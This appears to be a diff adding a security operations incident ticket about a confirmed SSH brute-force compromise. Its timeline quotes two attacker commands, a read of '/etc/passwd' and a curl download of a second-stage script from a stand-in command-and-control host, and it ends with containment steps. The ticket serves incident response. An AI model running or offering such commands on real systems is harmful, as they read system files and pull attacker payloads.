@@ -1,0 +1,21 @@
+================================================================================
+INCIDENT ESCALATION TICKET #INC-88341
+================================================================================
+Alert Title     : SSH Brute Force Detection
+Severity        : HIGH
+Classification  : TRUE POSITIVE (CONFIRMED COMPROMISE)
+Assigned Analyst: Level 1 SOC Analyst
+
+TIMELINE & TELEMETRY SUMMARY:
+--------------------------------------------------------------------------------
+- 2026-11-01 21:30:10 UTC - 10x Failed SSH Authentication attempts from 192.168.1.50 (user: root)
+- 2026-11-01 21:30:35 UTC - SUCCESSFUL SSH login for user root from 192.168.1.50
+- 2026-11-01 21:31:02 UTC - Executed sensitive file read: 'cat /etc/passwd'
+- 2026-11-01 21:31:15 UTC - Outbound network download: 'curl http://malicious-c2.com/stage2.sh'
+
+RECOMMENDED ACTIONS FOR TIER 2 / INCIDENT RESPONSE:
+1. Immediately terminate SSH session PID 10499 on LINUX-LAB-01.
+2. Isolate host LINUX-LAB-01 from the network segment.
+3. Block source IP 192.168.1.50 at the edge firewall.
+4. Rotate root SSH keys and credentials.
+================================================================================
